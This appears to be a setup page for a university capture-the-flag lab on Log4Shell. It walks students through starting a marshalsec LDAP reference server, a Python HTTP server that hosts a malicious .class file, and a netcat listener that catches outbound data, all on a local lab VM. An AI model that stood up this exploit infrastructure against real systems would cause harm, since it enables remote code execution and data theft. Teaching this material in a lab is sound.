---
layout: default
title: Setup
nav_order: 6
parent: Project Log4Shell!
grand_parent: Projects
---

<div style="text-align:center">
  <span id="setup" style="color: #003057; font-size:36px; font-weight: bold; text-decoration:underline">SETUP</span>
</div>
  
To get setup for the flags, follow the steps carefully below, and be sure you are running each in a separate terminal window as noted. 

You will need switch users to login to log4j user via:
 
```
  Username: log4j  Password: konami-code
```

In the home directory of log4j user, start the container with the start script: 
```bash 
  sudo ./StartContainer.sh
```

Open a new terminal window and go to “Desktop/log4shell/logs”:  
```bash 
  cd Desktop/log4shell/logs
```

Run the following command to view the logs:
```bash 
  tail -f cs6035.log
```

You should now see the tail of the log file from the application running. 

![alt text](/images/logoutput.PNG)

  *****If the logs stop populating, then just stop and restart the tail. This is happening because the data logged gets too large so the log “rolls over” to another file.*******


<span style="font-weight: bold">1. Run the LDAP Server:</span> \
Open a new terminal window and run the following command to set the current directory to “Desktop/log4shell/target”:  
```bash
  cd ~Desktop/log4shell/target
```
Next, start the LDAP server by running:
```bash 
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:4242/#Exploit"
```
You can get the ip address of the vm by running the block below in a terminal
```bash 
  ip addr show
``` 
This outputs the vm’s \<IP:PORT\>
```bash 
  127.0.0.1:4242
```
**It is very important that this matches the port specified in the Malicious server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct.**
You should see the following output:
![alt text](/images/ldapoutput.PNG) 
  
<span style="font-weight: bold">2. Run the Malicious Server:</span> \
Open a new terminal and make sure the active directory is the directory that contains your malicious .class file. For simplicity, we have created “Desktop/log4shell/{flag_no}” for you to work in. <span style="font-weight: bold">Do not leave this directory</span>. Run the server in “Desktop/log4shell/{flag_no}” by the following command:
```bash 
  python3 -m http.server 4242 
``` 
**It is very important that this matches the port specified in the LDAP server. If your exploit is not working because it is not connecting to the malicious server, your ports likely do not match OR the vm’s IP is not correct**
You should see the following output:
![alt text](/images/pythonserveroutput.PNG) 
  
<span style="font-weight: bold">3. Read data that is flowing on the network (This step is required for Flag 2 but is optional for the rest):</span> \
Open a terminal and run:
```bash 
  nc -nlvp <your_desired_port> 
``` 
You should see the following output:
![alt text](/images/nlvp.PNG)
